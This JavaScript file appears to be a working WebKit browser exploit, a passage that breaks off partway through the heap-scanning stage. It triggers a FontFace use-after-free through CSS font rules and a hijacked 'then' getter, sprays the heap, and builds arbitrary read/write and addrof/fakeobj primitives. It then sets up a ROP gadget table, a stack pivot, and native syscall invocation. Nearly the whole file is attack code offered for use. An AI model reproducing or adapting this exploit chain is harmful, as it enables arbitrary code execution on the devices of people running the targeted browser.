import { version, logger } from "../utils.mjs";
import { Offsets } from "./offsets.mjs";

//#region Constants

// used for rop
let m_executableOrRareData = undefined;
const syscalls = new Map();
const structs = new Map();
const fn = {};

// used for errno
let _error_addr = undefined;
let strerror_addr = undefined;

// used for base addrs
let webkit_base = undefined;
let libc_base = undefined;
let libkernel_base = undefined;

// used for structs
let timespec = undefined;

const spray_count = 0x80;
const spray_font_rule = `
  @font-face {
    font-family: spray;
    src: local(Helvetica Bold);
    unicode-range: U+0043;
  }
`;
const uaf_font_rule = `
  @font-face {
    font-family: b;
    src: url(nonexistent-font.woff);
    unicode-range: U+0042;
  }
`;
const helper = {
  dv: new DataView(new ArrayBuffer(8)),
  to_bigint(float) {
    this.dv.setFloat64(0, float, true);
    return this.dv.getBigUint64(0, true);
  },
  to_float(bigint) {
    this.dv.setUint32(0, Number(bigint.lo()), true);
    this.dv.setUint32(4, Number(bigint.htol()), true);
    return this.dv.getFloat64(0, true);
  },
};
const mem = {
  allocs: new Set(),
  fakes: new Map(),
  alloc(len, ptr = true) {
    const ab = new ArrayBuffer(len);
    this.allocs.add(ab);
    return ptr ? ab.data : ab;
  },
  free(ab) {
    return this.allocs.delete(ab);
  },
  free_all() {
    this.allocs.clear();

    // fix to avoid crash
    for (const [data, ab] of this.fakes) {
      const ab_addr = arw.addrof(ab);

      const m_impl = arw.view(ab_addr).getBigUint64(0x10, true);

      arw.view(m_impl).setBigUint64(0, 0, true); // DeferrableRefCountedBase::m_refCount
      arw.view(m_impl).setBigUint64(0x10, data, true); // m_contents.m_data
      arw.view(m_impl).setInt32(0x24, 0, true); // m_contents.m_sizeInBytes
    }

    this.fakes.clear();
  },
  copy(dst, src, len) {
    const src_u8 = new Uint8Array(ArrayBuffer.from(src, len));
    const dst_u8 = new Uint8Array(ArrayBuffer.from(dst, len));

    dst_u8.set(src_u8);
  },
  bset(addr, size, value = 0) {
    const u8 = new Uint8Array(ArrayBuffer.from(addr, len));
    u8.fill(value);
  },
  stob(str) {
    return typeof TextEncoder !== "undefined" ? new TextEncoder().encode(str) : Uint8Array.from(str, (c) => c.charCodeAt());
  },
  btos(u8) {
    return typeof TextDecoder !== "undefined" ? new TextDecoder().decode(u8) : Array.from(u8, (c) => String.fromCharCode(c)).join("");
  },
  strlen(addr, max = 0x3fff) {
    const u8 = new Uint8Array(ArrayBuffer.from(addr, max));

    const len = u8.indexOf(0);
    if (len === -1) {
      throw new Error("Invalid null-terminated string !!");
    }

    return len;
  },
};
const arw = {
  leak: { obj: 0 },
  leak_addr: 0n,
  master: undefined,
  victim: new DataView(new ArrayBuffer(0x30)),
  view(addr) {
    if (addr === 0n) {
      throw new Error("Empty addr !!");
    }

    this.master[4] = Number(addr.lo());
    this.master[5] = Number(addr.htol());

    return this.victim;
  },
  addrof(obj) {
    this.leak.obj = obj;
    return this.view(this.leak_addr).getBigUint64(0x10, true);
  },
  fakeobj(addr) {
    this.view(this.leak_addr).setUint32(0x10, Number(addr.lo()), true);
    this.view(this.leak_addr).setUint32(0x14, Number(addr.htol()), true);
    return this.leak.obj;
  },
};
const rop = {
  stack: undefined,
  frame: undefined,
  pivot: undefined,
  insts: [],
  reset() {
    this.stack.reset();
    this.frame.reset();
  },
  execute() {
    this.stack.prepare(this.insts, this.frame);
    this.pivot.prepare(this.stack.sp);

    const pivot_obj = {};
    const pivot_obj_addr = arw.addrof(pivot_obj);

    const empty_jscell = arw.view(pivot_obj_addr).getBigUint64(0, true);

    const pivot_addr = this.pivot.addr;
    arw.view(pivot_obj_addr).setBigUint64(0, pivot_addr, true);

    Math.expm1(pivot_obj);

    arw.view(pivot_obj_addr).setBigUint64(0, empty_jscell, true);
  },
};
const gadgets = {
  get RET() {
    return webkit_base + Offsets.current.wk_RET;
  },
  get LEAVE_RET() {
    return webkit_base + Offsets.current.wk_LEAVE_RET;
  },
  get POP_R8_RET() {
    return webkit_base + Offsets.current.wk_POP_R8_RET;
  },
  get POP_R9_RET() {
    return webkit_base + Offsets.current.wk_POP_R9_RET;
  },
  get POP_R10_RET() {
    return webkit_base + Offsets.current.wk_POP_R10_RET;
  },
  get POP_R11_RET() {
    return webkit_base + Offsets.current.wk_POP_R11_RET;
  },
  get POP_R12_RET() {
    return webkit_base + Offsets.current.wk_POP_R12_RET;
  },
  get POP_R13_RET() {
    return webkit_base + Offsets.current.wk_POP_R13_RET;
  },
  get POP_R14_RET() {
    return webkit_base + Offsets.current.wk_POP_R14_RET;
  },
  get POP_R15_RET() {
    return webkit_base + Offsets.current.wk_POP_R15_RET;
  },
  get POP_RAX_RET() {
    return webkit_base + Offsets.current.wk_POP_RAX_RET;
  },
  get POP_RBP_RET() {
    return webkit_base + Offsets.current.wk_POP_RBP_RET;
  },
  get POP_RBX_RET() {
    return webkit_base + Offsets.current.wk_POP_RBX_RET;
  },
  get POP_RCX_RET() {
    return webkit_base + Offsets.current.wk_POP_RCX_RET;
  },
  get POP_RDI_RET() {
    return webkit_base + Offsets.current.wk_POP_RDI_RET;
  },
  get POP_RDX_RET() {
    return webkit_base + Offsets.current.wk_POP_RDX_RET;
  },
  get POP_RSI_RET() {
    return webkit_base + Offsets.current.wk_POP_RSI_RET;
  },
  get POP_RSP_RET() {
    return webkit_base + Offsets.current.wk_POP_RSP_RET;
  },
  get MOV_RAX_RCX_RET() {
    return webkit_base + Offsets.current.wk_MOV_RAX_RCX_RET;
  },
  get MOV_QWORD_PTR_RDI_RAX_RET() {
    return webkit_base + Offsets.current.wk_MOV_QWORD_PTR_RDI_RAX_RET;
  },
  get MOV_RAX_QWORD_PTR_RDI_RET() {
    return webkit_base + Offsets.current.wk_MOV_RAX_QWORD_PTR_RDI_RET;
  },
  get PUSH_RAX_POP_RBP_RET() {
    return webkit_base + Offsets.current.wk_PUSH_RAX_POP_RBP_RET;
  },
  get PUSH_RAX_PUSH_RBP_RET() {
    return webkit_base + Offsets.current.wk_PUSH_RAX_PUSH_RBP_RET;
  },
  get PUSH_RBP_POP_RAX_RET() {
    return webkit_base + Offsets.current.wk_PUSH_RBP_POP_RAX_RET;
  },
  get POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_8() {
    return webkit_base + Offsets.current.wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_8;
  },
  get POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40() {
    return webkit_base + Offsets.current.wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40;
  },
  get PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20() {
    return webkit_base + Offsets.current.wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20;
  },
  get MOV_RSI_QWORD_PTR_RAX_10_CALL_QWORD_PTR_RAX_18() {
    return webkit_base + Offsets.current.wk_MOV_RSI_QWORD_PTR_RAX_10_CALL_QWORD_PTR_RAX_18;
  },
  get PUSH_RSI_JMP_QWORD_PTR_RAX() {
    return webkit_base + Offsets.current.wk_PUSH_RSI_JMP_QWORD_PTR_RAX;
  },
  get MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_38() {
    return webkit_base + Offsets.current.wk_MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_38;
  },
};
//#endregion
//#region Classes
class SyscallError extends Error {
  constructor(message) {
    super(`${message}\n\terrno ${errno()}: ${strerror()}`);
    this.name = "SyscallError";
  }
}
class Stack {
  constructor(size) {
    if (size % 8 !== 0) {
      throw new Error("Invalid stack size, not aligned by 8 bytes");
    }

    if (size < 0x1000) {
      throw new Error("Invalid stack size, minimal size is 0x1000 to init ROP");
    }

    this.view = new DataView(new ArrayBuffer(size));
    this.reset();
  }

  reset() {
    new Uint8Array(this.view.buffer).fill(0);
    this.offset = this.view.byteLength;
  }

  get sp() {
    return this.view.buffer.data + BigInt(this.offset);
  }

  /**
   * @param {Array} insts
   * @param {Frame} frame
   */
  prepare(insts, frame) {
    this.reset();

    for (let i = insts.length - 1; i >= 0; i--) {
      if (this.current < 1) {
        throw new Error("Stack full !!");
      }

      let inst = insts[i];

      if (typeof inst === "string") {
        if (typeof frame === "undefined") {
          throw new Error("Unable to resolve symbol without frame !!");
        }

        inst = frame.instof(inst);
      }

      this.offset -= 8;
      this.view.setBigUint64(this.offset, inst, true);
    }
  }
}
class Frame {
  constructor(list) {
    if (!Array.isArray(list)) {
      throw new Error(`Input frame is not an array !!`);
    }

    if (list.length === 0) {
      throw new Error("Empty frame length !!");
    }

    this.view = new DataView(new ArrayBuffer(list.length * 8));

    for (let i = 0; i < list.length; i++) {
      const name = list[i];

      if (typeof name !== "string") {
        throw new TypeError(`${name} not a string !!`);
      }

      if (name in this) {
        throw new Error(`Duplicated local variable ${name} !!`);
      }

      this[name] = i;
    }
  }

  reset() {
    new Uint8Array(this.view.buffer).fill(0);
  }

  instof(name) {
    let as_value = false;

    if (name.startsWith("[") && name.endsWith("]")) {
      name = name.slice(1, -1);
      as_value = true;
    }

    if (name in this) {
      return as_value ? this.get_value(name) : this.addrof(name);
    }

    throw new Error(`${name} not in frame !!`);
  }

  addrof(name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    return this.view.buffer.data + BigInt(this[name] * 8);
  }

  get_value(name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    return this.view.getBigUint64(this[name] * 8, true);
  }

  set_value(name, value) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    this.view.setBigUint64(this[name] * 8, value, true);
  }

  valueof(insts, name) {
    insts.push(`[${name}]`);
  }

  store(insts, name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    insts.push(gadgets.POP_RDI_RET);
    insts.push(name);
    insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  }

  load(insts, name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    insts.push(gadgets.POP_RDI_RET);
    insts.push(name);
    insts.push(gadgets.MOV_RAX_QWORD_PTR_RDI_RET);
  }

  pop(insts, gadget, name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    this.load(insts, name);

    insts.push(gadgets.POP_RBP_RET);
    insts.push(gadget);
    insts.push(gadgets.PUSH_RAX_PUSH_RBP_RET);
  }
}
class Pivot {
  constructor() {
    this.view = new DataView(new ArrayBuffer(0x48));

    this.view.setBigUint64(0, gadgets.POP_RSP_RET, true);
    this.view.setBigUint64(0x8, gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20, true);
    this.view.setBigUint64(0x18, gadgets.PUSH_RSI_JMP_QWORD_PTR_RAX, true);
    this.view.setBigUint64(0x20, gadgets.MOV_RSI_QWORD_PTR_RAX_10_CALL_QWORD_PTR_RAX_18, true);
    this.view.setBigUint64(0x38, gadgets.POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_8, true);
  }

  get addr() {
    return this.view.buffer.data;
  }

  prepare(sp) {
    this.view.setBigUint64(0x10, sp, true);
  }
}
class NativeFunction {
  constructor(input, ret) {
    this.ret = ret;

    if (typeof input === "bigint") {
      this.addr = input;
    } else if (typeof input === "number") {
      if (!syscalls.has(input)) {
        throw new Error(`Syscall ${input} not found !!`);
      }

      this.addr = syscalls.get(input);
    }
  }

  invoke() {
    if (arguments.length > 6) {
      throw new Error("More than 6 arguments is not supported !!");
    }

    rop.reset();

    rop.frame.set_value("rip", this.addr);
    rop.frame.set_value("rax", 0n);

    const ctx = [];
    const regs = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"];

    for (let i = 0; i < regs.length; i++) {
      const reg = regs[i];

      let value = arguments[i] ?? 0n;

      switch (typeof value) {
        case "bigint":
          break;
        case "boolean":
          value = value ? 1n : 0n;
          break;
        case "number":
          value = BigInt(value);
          break;
        case "string":
          value = value.cstr();
          ctx.push(value);
          break;
        default:
          throw new Error(`Invalid value of type ${typeof value} at arg ${i}`);
      }

      rop.frame.set_value(reg, value);
    }

    rop.execute();

    while (ctx.length > 0) {
      mem.free(ctx.pop());
    }

    let result;
    if (this.ret) {
      result = rop.frame.get_value("rax");

      switch (this.ret) {
        case "bigint":
          result = result.mask(64, true);
          break;
        case "number":
          result = Number(result.mask(64, true));
          break;
        case "boolean":
          result = result !== 0n;
          break;
        case "string":
          result = String.from(result);
          break;
        default:
          throw new Error(`Unsupported return type ${this.ret}`);
      }
    }

    return result;
  }

  chain() {
    if (arguments.length < 1) {
      throw new Error("insts argument is required to chain with !!");
    }

    if (!Array.isArray(arguments[0])) {
      throw new Error(`insts argument is not an array !!`);
    }

    if (arguments.length > 7) {
      throw new Error("More than 6 arguments is not supported !!");
    }

    const regs = [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_RCX_RET, gadgets.POP_R8_RET, gadgets.POP_R9_RET];

    const insts = arguments[0];

    insts.push(gadgets.POP_RAX_RET);
    insts.push(0n);

    for (let i = 1; i < arguments.length; i++) {
      const reg = regs[i - 1];

      insts.push(reg);

      let value = arguments[i];

      switch (typeof value) {
        case "bigint":
          break;
        case "boolean":
          value = value ? 1n : 0n;
          break;
        case "number":
          value = BigInt(value);
          break;
        case "string":
          value = value.cstr();
          break;
        default:
          throw new Error(`Invalid value at arg ${i - 1}`);
      }

      insts.push(value);
    }

    insts.push(this.addr);
  }
}
class Struct {
  constructor(name, fields) {
    if (structs.has(name)) {
      return structs.get(name);
    }

    if (!Array.isArray(fields)) {
      throw new Error("Input fields is not an array !!");
    }

    if (fields.length === 0) {
      throw new Error("Empty fields array !!");
    }

    let offset = 0;
    let alignof = 1;

    for (const field of fields) {
      field.size = Struct.type_size(field.type);
      field.align = Struct.type_align(field.type);
      field.offset = offset = offset.alignUp(field.align);
      field.count = field.count ?? 1;

      offset += field.size * field.count;
      alignof = Math.max(alignof, field.align);
    }

    this.name = name;
    this.fields = Object.fromEntries(fields.map((f) => [f.name, f]));
    this.sizeof = offset.alignUp(alignof);
    this.alignof = alignof;

    logger?.debug(`registering ${this.name}: sizeof: ${this.sizeof}, alignof: ${this.alignof}`);

    structs.set(this.name, this);
  }

  new(addr) {
    const instance = { addr: addr ?? mem.alloc(this.sizeof), struct: this };
    return new Proxy(instance, {
      get: (target, prop) => {
        if (prop in target) return target[prop];

        if (!isNaN(prop)) {
          const i = Number(prop);
          return target.struct.new(target.addr + BigInt(i * target.struct.sizeof));
        }

        const field = target.struct.fields[prop];
        if (!field) return undefined;

        let type = field.type;
        let addr = target.addr + BigInt(field.offset);

        if (field.count > 1) {
          const size = field.size * field.count;
          const buf = ArrayBuffer.from(addr, size);

          switch (type) {
            case "Int8":
              return new Int8Array(buf);
            case "Uint8":
              return new Uint8Array(buf);
            case "Int16":
              return new Int16Array(buf);
            case "Uint16":
              return new Uint16Array(buf);
            case "Int32":
              return new Int32Array(buf);
            case "Uint32":
              return new Uint32Array(buf);
            case "Int64":
            case "Uint64":
              throw new Error(`type ${field.type} not supported !!`);
            default:
              throw new Error(`Invalid type ${field.type}`);
          }
        } else {
          if (type.endsWith("*")) {
            type = type.slice(0, -1);
            addr = arw.view(target.addr).getBigUint64(field.offset, true);
          }

          if (structs.has(type)) {
            const struct = structs.get(type);
            return struct.new(addr);
          }

          switch (type) {
            case "Int8":
              return arw.view(addr).getInt8(0, true);
            case "Uint8":
              return arw.view(addr).getUint8(0, true);
            case "Int16":
              return arw.view(addr).getInt16(0, true);
            case "Uint16":
              return arw.view(addr).getUint16(0, true);
            case "Int32":
              return arw.view(addr).getInt32(0, true);
            case "Uint32":
              return arw.view(addr).getUint32(0, true);
            case "Int64":
              return arw.view(addr).getBigInt64(0, true);
            case "Uint64":
              return arw.view(addr).getBigUint64(0, true);
            default:
              throw new Error(`Invalid type ${field.type}`);
          }
        }
      },
      set: (target, prop, value) => {
        if (!isNaN(prop)) {
          const i = Number(prop);
          if (!value.hasOwnProperty("struct")) {
            throw new Error("Value is not a Struct");
          }

          if (target.struct.name !== value.struct.name) {
            throw new Error(`Expected ${target.struct.name} got ${value.struct.name} !!`);
          }

          mem.copy(target.addr + i * target.struct.sizeof, value.addr, target.struct.sizeof);
        } else {
          const field = target.struct.fields[prop];
          if (!field) return undefined;

          let type = field.type;
          let addr = target.addr + BigInt(field.offset);

          if (field.count > 1) {
            const size = field.size * field.count;

            if (!ArrayBuffer.isView(value)) {
              throw new Error("Value is not a TypedArray");
            }

            if (value.buffer.byteLength !== size) {
              throw new Error(`Expected ${size} bytes got ${value.buffer.byteLength} !!`);
            }

            mem.copy(addr, value.buffer.getBackingStore(), size);
          } else {
            if (type.endsWith("*")) {
              if (typeof value !== "bigint") {
                throw new Error("Value is not a pointer");
              }

              arw.view(target.addr).setBigUint64(field.offset, value, true);
              return;
            }

            if (structs.has(type)) {
              const struct = structs.get(type);

              if (!value.hasOwnProperty("addr")) {
                throw new Error("Value is not a Struct");
              }

              mem.copy(addr, value.addr, struct.sizeof);
              return;
            }

            switch (type) {
              case "Int8":
                arw.view(addr).setInt8(0, value, true);
                break;
              case "Uint8":
                arw.view(addr).setUint8(0, value, true);
                break;
              case "Int16":
                arw.view(addr).setInt16(0, value, true);
                break;
              case "Uint16":
                arw.view(addr).setUint16(0, value, true);
                break;
              case "Int32":
                arw.view(addr).setInt32(0, value, true);
                break;
              case "Uint32":
                arw.view(addr).setUint32(0, value, true);
                break;
              case "Int64":
                arw.view(addr).setBigInt64(0, value, true);
                break;
              case "Uint64":
                arw.view(addr).setBigUint64(0, value, true);
                break;
              default:
                throw new Error(`Invalid type ${field.type}`);
            }
          }
        }

        return true;
      },
    });
  }

  static type_size(type) {
    if (type.endsWith("*")) {
      return 8;
    } else if (structs.has(type)) {
      return structs.get(type).sizeof;
    } else {
      return Struct.primitive_size(type);
    }
  }

  static type_align(type) {
    if (type.endsWith("*")) {
      return 8;
    } else if (structs.has(type)) {
      return structs.get(type).alignof;
    } else {
      return Struct.primitive_size(type);
    }
  }

  static primitive_size(type) {
    const bits = type.replace(/\D/g, "");
    if (bits % 8 !== 0) {
      throw new Error(`Invalid primitive type ${type}`);
    }

    return bits / 8;
  }
}
//#endregion
//#region Extensions
BigInt.prototype.hi = function () {
  return this & ~0xffffffffn;
};

BigInt.prototype.lo = function () {
  return this & 0xffffffffn;
};

BigInt.prototype.htol = function () {
  return this.hi() >> 0x20n;
};

BigInt.prototype.hex = function (padded = true, maxLength = 16) {
  const value = this < 0n ? BigInt.asUintN(64, this) : this;
  let str = value.toString(16).toUpperCase();

  if (padded) {
    str = str.padStart(maxLength, "0");
  }

  return `0x${str}`;
};

BigInt.prototype.mask = function (bits, signed = false) {
  return signed ? BigInt.asIntN(bits, this) : BigInt.asUintN(bits, this);
};

BigInt.prototype.alignUp = function (alingment = 1n) {
  const mask = alingment - 1n;
  return (this + mask) & ~mask;
};

BigInt.prototype.alignDown = function (alingment = 1n) {
  const mask = alingment - 1n;
  return this & ~mask;
};

Number.prototype.hex = function (padded = false, maxLength = 16) {
  let str = this.toString(16).toUpperCase();

  if (padded) {
    str = str.padStart(maxLength, "0");
  }

  return `0x${str}`;
};

Number.prototype.alignUp = function (alignment) {
  const mask = alignment - 1;
  return (this + mask) & ~mask;
};

Number.prototype.alignDown = function (alignment) {
  const mask = alingment - 1;
  return this & ~mask;
};

DataView.prototype.getBigUint64 =
  DataView.prototype.getBigUint64 ||
  function (byteOffset, littleEndian) {
    const lo = this.getUint32(byteOffset, littleEndian);
    const hi = this.getUint32(byteOffset + 4, littleEndian);
    return BigInt.from(hi, lo);
  };

DataView.prototype.getBigInt64 =
  DataView.prototype.getBigInt64 ||
  function (byteOffset, littleEndian) {
    const lo = this.getUint32(littleEndian ? byteOffset : byteOffset + 4, littleEndian);
    const hi = this.getInt32(littleEndian ? byteOffset + 4 : byteOffset, littleEndian);
    return BigInt.from(hi, lo);
  };

DataView.prototype.setBigUint64 =
  DataView.prototype.setBigUint64 ||
  function (byteOffset, value, littleEndian) {
    const lo = Number(value.lo());
    const hi = Number(value.htol());

    this.setUint32(byteOffset, lo, littleEndian);
    this.setUint32(byteOffset + 4, hi, littleEndian);
  };

DataView.prototype.setBigInt64 =
  DataView.prototype.setBigInt64 ||
  function (byteOffset, value, littleEndian) {
    value = value.mask(64, true);

    const lo = Number(value.lo());
    const hi = Number(value.htol());

    if (littleEndian) {
      this.setUint32(byteOffset, lo, true);
      this.setInt32(byteOffset + 4, hi, true);
    } else {
      this.setInt32(byteOffset, hi, false);
      this.setUint32(byteOffset + 4, lo, false);
    }
  };

Object.defineProperty(ArrayBuffer.prototype, "data", {
  get() {
    const ab_addr = arw.addrof(this);

    const m_impl = arw.view(ab_addr).getBigUint64(0x10, true);

    return arw.view(m_impl).getBigUint64(0x10, true); // m_data
  },
  set(value) {
    const ab_addr = arw.addrof(this);

    const m_impl = arw.view(ab_addr).getBigUint64(0x10, true);

    arw.view(m_impl).setBigUint64(0x10, value, true); // m_data
  },
});

String.prototype.cstr = function () {
  const ab = mem.alloc(this.length + 1);
  const u8 = new Uint8Array(this.length + 1);

  for (let i = 0; i < this.length; i++) {
    u8[i] = this.charCodeAt(i) & 0xff;
  }

  u8[this.length] = 0;
  return u8.buffer.data;
};
//#endregion
//#region Static
BigInt.from = function (hi, lo) {
  return (BigInt(hi) << 32n) | BigInt(lo);
};

String.from = function (addr, max = 0x3fff) {
  if (addr === 0n) return "";

  const len = mem.strlen(addr, max);

  if (len === 0) return "";

  const u8 = new Uint8Array(len);

  mem.copy(u8.buffer.data, addr, len);

  return mem.btos(u8);
};

ArrayBuffer.from = function (addr, len = -1) {
  if (addr === 0n) {
    throw new RangeError("Empty addr !!");
  }

  const ab = new ArrayBuffer(0);
  const ab_addr = arw.addrof(ab);

  const m_impl = arw.view(ab_addr).getBigUint64(0x10, true);
  const m_data = arw.view(m_impl).getBigUint64(0x10, true);

  arw.view(m_impl).setBigUint64(0, 2n, true); // DeferrableRefCountedBase::m_refCount
  arw.view(m_impl).setBigUint64(0x10, addr, true); // m_contents.m_data
  arw.view(m_impl).setInt32(0x24, len, true); // m_contents.m_sizeInBytes

  mem.fakes.set(m_data, ab); // fix later

  return ab;
};
//#endregion
//#region Functions
function errno() {
  if (!("_error" in fn)) {
    throw new Error("_error undefined !!");
  }

  return arw.view(fn._error.invoke()).getUint32(0, true);
}

function strerror() {
  if (!("_strerror" in fn)) {
    throw new Error("strerror undefined !!");
  }

  return fn._strerror.invoke(errno());
}

function sleep(nsec) {
  const time = timespec.new();

  time.tv_sec = BigInt(Math.floor(nsec / 1e9));
  time.tv_nsec = BigInt(nsec % 1e9);

  if (fn.nanosleep.invoke(time.addr) === -1) {
    throw new SyscallError(`Unable to sleep for ${nsec} nano seconds !!`);
  }

  mem.free(time.addr);
}

async function init_arw() {
  logger.info("Initiate UAF...");

  const abs = new Array(spray_count);

  // FontFace A with a local source so it resolves synchronously
  const A = new FontFace("a", "local(Helvetica)", { unicodeRange: "U+0041" });

  document.fonts.add(A);

  // Register a DeferredPromise on A
  void A.loaded;

  const style = document.createElement("style");
  document.head.appendChild(style);

  // Shape heap around B in order to reclaim it after free
  for (let i = 0; i < spray_count / 4; i++) {
    style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
  }

  // FontFace B with a remote source so it resolves asynchronously
  const uaf_font_rule_index = style.sheet.cssRules.length;
  style.sheet.insertRule(uaf_font_rule, style.sheet.cssRules.length);

  // Shape heap around B in order to reclaim it after free
  for (let i = spray_count / 4; i < spray_count; i++) {
    style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
  }

  // Forces style recalculation and FontFace instantiation
  document.body.offsetTop;

  const old_then = FontFace.prototype.then;

  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    get() {
      if (this === A) {
        // Free B while FontFaceSet::load still holds a raw reference to it in matchingFaces
        style.sheet.deleteRule(0);

        // Forces style recalculation and FontFace deconstruction
        document.body.offsetTop;

        // Free B's neighbours
        for (let i = spray_count - 1; i > 0; i--) {
          if (i !== uaf_font_rule_index) {
            style.sheet.deleteRule(i);
          }
        }

        // Forces style recalculation and FontFace deconstruction
        document.body.offsetTop;

        // Spray ArrayBuffer with FontFace size and populate it so it survives crash
        for (let i = 0; i < abs.length; i++) {
          const ab = new ArrayBuffer(Offsets.current.wk_CSSFontFace_sizeof);
          const view = new DataView(ab);

          view.setBigUint64(8, 1n, true); // ref count
          view.setUint8(Offsets.current.wk_CSSFontFace_m_status, 3); // m_status: Status::Success

          abs[i] = ab;
        }
      }

      return undefined;
    },
  });

  // Loading 'AB' needs both U+0041 (from A) and U+0042 (from the CSS rule)
  // A resolves synchronously, firing the thenable check getter above
  const fonts = await document.fonts.load("1em a, b", "AB");

  logger.debug(`fonts: ${fonts}`);

  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    value: old_then,
  });

  // Check if both A and B are loaded
  if (fonts.length !== 2) {
    throw new Error("Unable to reclaim UAF FontFace !!");
  }

  logger.info("UAF Achieved !!");

  // used to setup ARW
  const rw = {
    uaf_ab: undefined,
    uaf_font: undefined,
    oob_arr: undefined,
    obj_arr: undefined,
    read(addr, size) {
      const ab = new ArrayBuffer(size);
      const u8 = new Uint8Array(ab);

      let offset = 0;
      while (offset < size) {
        const ptr = addr + BigInt(offset);

        uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_featureSettings_m_buffer, ptr, true); // m_featureSettings.m_buffer
        uaf_view.setInt32(Offsets.current.wk_CSSFontFace_m_featureSettings_m_size, 1, true); // m_featureSettings.m_size
        uaf_view.setInt32(Offsets.current.wk_CSSFontFace_m_featureSettings_m_capacity, 1, true); // m_featureSettings.m_capacity

        // read m_tag since its std::array<char, 4> and skip the " chars
        for (let i = 1; i < 5; i++) {
          u8[offset++] = this.uaf_font.featureSettings.charCodeAt(i);
        }
      }

      return ab;
    },
    read8(addr) {
      const ab = this.read(addr, 8);
      const view = new DataView(ab);
      return view.getBigUint64(0, true);
    },
    addrof(obj) {
      this.obj_arr[0] = obj;
      return helper.to_bigint(this.oob_arr[4]);
    },
    fakeobj(addr) {
      this.oob_arr[4] = helper.to_float(addr);
      return this.obj_arr[0];
    },
  };

  // UAF FontFace has default unicodeRange value U+0-10FFFF
  for (const font of fonts) {
    if (font.unicodeRange === "U+0-10FFFF") {
      logger.info("Found UAF FontFace !!");
      rw.uaf_font = font;
      break;
    }
  }

  if (rw.uaf_font === undefined) {
    throw new Error("Unable to find UAF error !!");
  }

  fonts.length = 0;

  // UAF ArrayBuffer has ref count of 2 due to FontFace return to script
  for (const ab of abs) {
    const view = new DataView(ab);
    if (view.getBigUint64(8, true) === 2n) {
      logger.info("Found ArrayBuffer of UAF FontFace !!");
      rw.uaf_ab = ab;
      break;
    }
  }

  if (rw.uaf_ab === undefined) {
    throw new Error("Unable to find ArrayBuffer of UAF FontFace !!");
  }

  abs.length = 0;

  const uaf_view = new DataView(rw.uaf_ab);

  const m_clients = uaf_view.getBigUint64(Offsets.current.wk_CSSFontFace_m_clients, true);
  const m_wrapper = uaf_view.getBigUint64(Offsets.current.wk_CSSFontFace_m_wrapper, true);

  logger.debug(`m_clients: ${m_clients.hex()}`);
  logger.debug(`m_wrapper: ${m_wrapper.hex()}`);

  const m_wrapper_m_ptr = rw.read8(m_wrapper + 8n);
  logger.debug(`m_wrapper_m_ptr: ${m_wrapper_m_ptr.hex()}`);

  const m_backing = rw.read8(m_wrapper_m_ptr + 0x28n);
  logger.debug(`m_backing: ${m_backing.hex()}`);

  const views = [];
  const props = [];
  const marker = 0xfffe000041414141n;
  const marker_ffs = 0xfffe000042424242n;

  // Spray ArrayWithDoubles and ArrayWithContiguous arrays to be used for addrof/fakeobj
  for (let i = 0; i < spray_count; i++) {
    views.push(new Array(1.1, 1.1));
    views.push(new Array({}, {}));
    views.push(new FontFace("spray", "", {}));
  }

  // Spray marker and target JS object as props
  for (let i = 0; i < views.length; i++) {
    if (i % 3 === 0) {
      props.push({ value: Number(marker.lo()) });
      props.push({ value: views[i] });
    }
    if (i % 3 === 2) {
      props.push({ value: Number(marker_ffs.lo()) });
      props.push({ value: views[i] });
    }
  }

  let found = false;
  let found_ffs = false;
  let m_thread = undefined;
  let oob_arr_indexing_header_addr = undefined;
  let start = m_backing.alignUp(0x4000n);
  while (true) {
    // Allocates Vector<PropertyDescriptor> and MarkedArgumentBuffer, both of which uses fastMalloc which will spray our props into fastMalloc heap
    Object.defineProperties({}, props);

    const dv = new DataView(rw.read(start, 0x100));

    for (let i = 0; i < dv.byteLength / 8; i += 8) {
      if (!found && dv.getBigUint64(i, true) === marker) {
        const marker = start + BigInt(i * 8);
        logger.info(`Found Array marker at ${marker.hex()} !!`);

        const oob_arr_addr = rw.read8(marker + 0x20n);
        logger.debug(`oob_arr_addr: ${oob_arr_addr.hex()}`);

        const oob_arr_butterfly = rw.read8(oob_arr_addr + 8n);
        logger.debug(`oob_arr_butterfly: ${oob_arr_butterfly.hex()}`);

        oob_arr_indexing_header_addr = oob_arr_butterfly - 8n;
        logger.debug(`oob_arr_indexing_header_addr: ${oob_arr_indexing_header_addr.hex()}`);

        const oob_arr_indexing_header = rw.read8(oob_arr_indexing_header_addr);

        if (oob_arr_indexing_header.lo() !== 2n || oob_arr_indexing_header.htol() !== 3n) {
          continue;
        }

        found = true;
      }

      if (!found_ffs && dv.getBigUint64(i, true) === marker_ffs) {
        const marker = start + BigInt(i * 8);
